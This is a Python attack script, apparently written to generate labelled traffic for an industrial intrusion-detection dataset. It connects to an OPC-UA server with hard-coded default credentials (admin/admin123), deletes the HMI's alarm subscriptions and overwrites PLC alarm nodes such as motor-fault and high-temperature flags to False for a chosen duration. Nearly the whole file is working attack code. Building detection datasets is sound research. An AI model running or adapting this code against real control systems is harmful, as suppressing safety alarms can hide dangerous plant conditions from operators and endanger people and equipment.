"""
HMI_ALARM_SUPPRESS
Kỹ thuật: Hủy OPC-UA subscription để HMI không nhận được cảnh báo
Observable: OPC-UA DeleteSubscriptions request bất thường

Gọi từ bash:
  python -m attacks_ext.hmi_alarm_suppress \
      --duration 300 --opc-url opc.tcp://192.168.1.20:4840 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
from attacks_ext.config_ext import base_parser, write_label

ALARM_NODES = [
    "ns=2;s=PLC.Alarms.HighLevel",
    "ns=2;s=PLC.Alarms.LowPressure",
    "ns=2;s=PLC.Alarms.MotorFault",
    "ns=2;s=PLC.Alarms.TempHigh",
]


def run(args):
    label_prefix = "HMI_ALARM_SUPPRESS"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s opc={args.opc_url}")

    monitored_items = []

    try:
        from opcua import Client
        client = Client(args.opc_url)
        if hasattr(args, "opc_username") and args.opc_username:
            client.set_user(args.opc_username)
        if hasattr(args, "opc_password") and args.opc_password:
            client.set_password(args.opc_password)
        client.connect()
        print(f"[+] Đã kết nối OPC-UA")

        print("[*] Tạo subscription giả lập HMI đang monitor...")
        sub = client.create_subscription(500, handler=None)

        for node_id in ALARM_NODES:
            node = client.get_node(node_id)
            try:
                handle = sub.subscribe_data_change(node)
                monitored_items.append(handle)
                print(f"  [SUB] Đang monitor: {node_id}")
            except Exception as e:
                print(f"  [WARN] Không thể subscribe {node_id}: {e}")

        print(f"\n[*] HMI đang nhận {len(monitored_items)} alarm subscription")
        time.sleep(5)

        print("\n[!] TẤN CÔNG: Xóa toàn bộ alarm subscription...")
        sub.delete()
        print("[!] Đã xóa subscription - HMI mù cảnh báo!")

        print("\n[!] Ghi đè giá trị alarm về False...")
        for node_id in ALARM_NODES:
            node = client.get_node(node_id)
            try:
                node.set_value(False)
                print(f"  [SUPPRESS] {node_id} <- False")
            except Exception as e:
                print(f"  [WARN] {node_id}: {e}")

        suppress_dur = args.duration - 20
        if suppress_dur > 0:
            print(f"\n[*] Duy trì trạng thái tắt cảnh báo trong {suppress_dur}s...")
            time.sleep(suppress_dur)

        client.disconnect()

    except ImportError:
        print("[ERR] opcua chưa được cài đặt. Cài: pip install opcua")
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"alarm_subs={len(monitored_items)}")


def main():
    p = base_parser("HMI Alarm Suppress Attack")
    p.add_argument("--opc-url", default="opc.tcp://192.168.1.20:4840")
    p.add_argument("--opc-username", default="admin")
    p.add_argument("--opc-password", default="admin123")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
